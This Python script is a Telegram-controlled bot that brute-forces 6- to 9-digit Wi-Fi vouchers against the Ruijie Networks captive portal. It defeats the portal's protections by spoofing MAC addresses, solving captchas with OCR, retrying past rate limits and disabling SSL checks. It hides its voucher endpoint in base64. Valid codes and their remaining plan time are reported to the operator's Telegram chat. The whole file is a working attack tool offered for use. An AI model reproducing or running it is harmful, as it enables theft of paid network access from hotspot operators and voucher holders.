#!/usr/bin/env python3
# ==============================================
#  Ruijie Voucher Scanner  —  v7.4 (Telegram Commands)
# ==============================================

import requests
import threading
import time
import sys
import os
import asyncio
import aiohttp
import base64
import random
import re
import string
import json
from datetime import datetime
import ssl
import urllib3
from flask import Flask, request
from threading import Thread

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

# ==================== SSL & WARNING BYPASS ====================
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================
#  COLORS
# =============================================
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"

def cprint(text, color=C.WHITE, bold=False, end="\n"):
    b = C.BOLD if bold else ""
    print(f"{b}{color}{text}{C.RESET}", end=end)

# ========== CONFIG (from Environment Variables) ==========
TARGET_URL = os.getenv("TARGET_URL", "")
MODE = os.getenv("MODE", "6")
SCAN_TYPE = os.getenv("SCAN_TYPE", "sequential")
THREADS = int(os.getenv("THREADS", "50"))
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
FOUND_FILE = "found_voucher.txt"
RESULT_FILE = "scan_results.txt"

# =============================================
#  FLASK WEB SERVER (for Render)
# =============================================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# =============================================
#  TELEGRAM BOT
# =============================================
scanning_active = False
current_scan_type = SCAN_TYPE
current_mode = MODE
current_url = TARGET_URL

def send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=3)
    except:
        pass

def handle_telegram_updates():
    global current_scan_type, current_mode, current_url, scanning_active
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={last_update_id+1}&timeout=30"
            response = requests.get(url, timeout=30)
            if response.status_code != 200:
                time.sleep(5)
                continue
            
            data = response.json()
            if not data.get("ok"):
                time.sleep(5)
                continue
            
            for update in data.get("result", []):
                last_update_id = update.get("update_id", last_update_id)
                message = update.get("message", {})
                if not message:
                    continue
                
                chat_id = str(message.get("chat", {}).get("id", ""))
                if chat_id != TELEGRAM_CHAT_ID:
                    continue
                
                text = message.get("text", "").strip()
                if not text:
                    continue
                
                if text.startswith("/scan_type"):
                    parts = text.split()
                    if len(parts) < 2:
                        send_telegram("❌ Usage: /scan_type sequential or /scan_type random")
                        continue
                    new_type = parts[1].lower()
                    if new_type not in ["sequential", "random"]:
                        send_telegram("❌ Invalid scan type. Use: sequential or random")
                        continue
                    current_scan_type = new_type
                    send_telegram(f"✅ Scan type changed to: {new_type}")
                
                elif text.startswith("/mode"):
                    parts = text.split()
                    if len(parts) < 2:
                        send_telegram("❌ Usage: /mode 6, 7, 8, or 9")
                        continue
                    new_mode = parts[1]
                    if new_mode not in ["6", "7", "8", "9"]:
                        send_telegram("❌ Invalid mode. Use: 6, 7, 8, or 9")
                        continue
                    current_mode = new_mode
                    send_telegram(f"✅ Mode changed to: {new_mode}")
                
                elif text.startswith("/url"):
                    parts = text.split(maxsplit=1)
                    if len(parts) < 2:
                        send_telegram("❌ Usage: /url https://portal-as.ruijienetworks.com/...")
                        continue
                    new_url = parts[1].strip()
                    if "ruijienetworks.com" not in new_url:
                        send_telegram("❌ Invalid URL. Must contain ruijienetworks.com")
                        continue
                    current_url = new_url
                    send_telegram(f"✅ URL updated successfully!")
                
                elif text == "/status":
                    status = f"📊 Current Status:\n\n"
                    status += f"🔢 Mode: {current_mode}\n"
                    status += f"📡 Scan Type: {current_scan_type}\n"
                    status += f"🔍 Scan Active: {scanning_active}\n"
                    status += f"🔗 URL: {current_url[:50]}...\n"
                    send_telegram(status)
                
                elif text == "/start":
                    send_telegram("🤖 Ruijie Voucher Scanner Bot\n\n"
                                 "Commands:\n"
                                 "/scan_type sequential - Set sequential scan\n"
                                 "/scan_type random - Set random scan\n"
                                 "/mode 6 - Set 6-digit mode\n"
                                 "/mode 7 - Set 7-digit mode\n"
                                 "/mode 8 - Set 8-digit mode\n"
                                 "/mode 9 - Set 9-digit mode\n"
                                 "/url <portal_url> - Set portal URL\n"
                                 "/status - Show current status\n"
                                 "/start_scan - Start scanning\n"
                                 "/stop_scan - Stop scanning")
                
                elif text == "/start_scan":
                    if scanning_active:
                        send_telegram("⚠️ Scan is already running!")
                        continue
                    if not current_url:
                        send_telegram("❌ No URL set. Use /url to set one.")
                        continue
                    scanning_active = True
                    send_telegram(f"🚀 Starting scan with:\nMode: {current_mode}\nType: {current_scan_type}")
                    Thread(target=run_scan_thread, daemon=True).start()
                
                elif text == "/stop_scan":
                    if not scanning_active:
                        send_telegram("⚠️ No scan is running.")
                        continue
                    scanning_active = False
                    send_telegram("⏹️ Scan stopped.")
                
        except Exception as e:
            print(f"Telegram error: {e}")
            time.sleep(5)

def run_scan_thread():
    global scanning_active
    try:
        # Determine range based on mode
        if current_mode == "6":
            start_code, end_code = 0, 999999
        elif current_mode == "7":
            start_code, end_code = 0, 9999999
        elif current_mode == "8":
            start_code, end_code = 0, 99999999
        elif current_mode == "9":
            start_code, end_code = 0, 999999999
        else:
            send_telegram(f"❌ Invalid mode: {current_mode}")
            scanning_active = False
            return
        
        send_telegram(f"🔍 Scanning {current_mode}-digit codes...")
        asyncio.run(run_scan(current_url, start_code, end_code, THREADS))
        scanning_active = False
        send_telegram("✅ Scan completed successfully!")
    except Exception as e:
        send_telegram(f"❌ Error during scan: {str(e)}")
        scanning_active = False

# =============================================
#  ENGINE (same as before)
# =============================================
_connector = None
_voucher_sem = None
_ocr = None
stop_flag = False
found_codes = []
limited_codes = []
retry_total = 0
tried = 0
hits = []
lock = threading.Lock()
start_time = None

def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return ocr.classification(buf.tobytes()).upper()

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,*/*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous

async def Captcha_Image(sess, session_id):
    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36'}
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=headers, ssl=False
    ) as r:
        return await r.read()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Varify_Captcha(sess, session_id, text):
    headers = {'content-type': 'application/json'}
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=headers, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None

async def Code_Expires_Date(session_id):
    endpoints = [
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
    ]
    headers = {'accept': 'application/json', 'user-agent': 'Mozilla/5.0'}
    for url in endpoints:
        try:
            async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes') or res.get('totalMinutes')
                    if remaining is not None:
                        hh, mm = divmod(int(remaining), 60)
                        return f"Plan: {plan} | Time: {hh}h {mm}m"
        except:
            continue
    return "Plan:Unknown | Time:Unknown"

_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code):
    global retry_total, tried, hits
    for attempt in range(3):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=30)) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return
            auth_code = None
            if _HAS_OCR:
                for _ in range(8):
                    img = await Captcha_Image(sess, session_id)
                    text = await Captcha_Text(img)
                    if not text:
                        continue
                    if await Varify_Captcha(sess, session_id, text):
                        auth_code = text
                        break
            if not auth_code:
                return
            if stop_flag:
                return
            payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
            except:
                return
        if 'request limited' in response:
            retry_total += 1
            await asyncio.sleep(0.5)
            continue
        break
    else:
        return
    with lock:
        tried += 1
    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        found_codes.append(f"{code} | {info}")
        with lock:
            hits.append(code)
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[SUCCESS] {code}  |  {info}\n")
        send_telegram(f"✅ Voucher found: {code}\n{info}\nURL: {session_url}")
        cprint(f"\n[+] SUCCESS CODE: {code} | {info}", C.GREEN)
    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        limited_codes.append(f"{code} | {info}")
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[LIMITED] {code}  |  {info}\n")
        send_telegram(f"⚠️ LIMITED CODE: {code}\n{info}")
        cprint(f"\n[-] LIMITED CODE: {code} | {info}", C.YELLOW)

def iter_sequential_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    for i in range(start, end + 1):
        yield str(i).zfill(digits)

def iter_random_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c

def stats_printer():
    while not stop_flag:
        time.sleep(1)
        elapsed = time.time() - start_time
        speed = tried / elapsed if elapsed > 0 else 0
        sys.stdout.write(f"\r\U0001F552 SPEED: {speed:.1f} c/s | TRIED: {tried} | HITS: {len(hits)}")
        sys.stdout.flush()
    print()

async def run_scan(session_url, start_code, end_code, workers):
    global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time
    _init_ocr()
    tried = 0
    hits = []
    found_codes = []
    limited_codes = []
    retry_total = 0
    stop_flag = False
    _connector = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    _voucher_sem = asyncio.Semaphore(workers)
    digits = max(len(str(start_code)), len(str(end_code)))
    total = end_code - start_code + 1
    
    if current_scan_type.lower() == "random":
        code_iter = iter_random_codes(start_code, end_code)
        cprint(f"\n  [+] Mode: Random ({digits}-digit)", C.CYAN, bold=True)
    else:
        code_iter = iter_sequential_codes(start_code, end_code)
        cprint(f"\n  [+] Mode: Sequential ({digits}-digit)", C.CYAN, bold=True)
    
    cprint(f"  [+] Range: {str(start_code).zfill(digits)} -> {str(end_code).zfill(digits)} ({total:,} codes)", C.YELLOW)
    cprint(f"  [+] Workers: {workers}\n", C.GREEN)
    start_time = time.time()
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()
    checked = 0
    try:
        while not stop_flag:
            batch = []
            for _ in range(500):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c)
            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)
    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        await _connector.close()
    elapsed = time.time() - start_time
    cprint(f"\n  [+] Completed in {elapsed:.2f} seconds", C.GREEN, bold=True)
    cprint(f"      Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)}", C.CYAN)
    if hits:
        cprint(f"  [+] Voucher found: {hits[0]}", C.GREEN, bold=True)
        with open(FOUND_FILE, "w") as f:
            f.write(f"{hits[0]}\n")
        if found_codes:
            cprint("  [+] All success codes:", C.YELLOW)
            for c in found_codes:
                cprint(f"      {c}", C.GREEN)
    else:
        cprint("  [-] No valid voucher found.", C.RED)
        send_telegram(f"Scan finished on {session_url}\nTried {tried} codes, no hits.")

def main():
    global stop_flag, current_scan_type, current_mode, current_url, scanning_active
    # Start web server
    Thread(target=run_web, daemon=True).start()
    
    # Start Telegram handler
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        Thread(target=handle_telegram_updates, daemon=True).start()
        send_telegram("🤖 Bot started! Use /start for commands.")
    else:
        print("⚠️ Telegram credentials not set. Bot will not respond to commands.")
    
    # Keep main thread alive
    while True:
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n  [!!] Interrupted by user.", C.YELLOW)
        sys.exit(0)
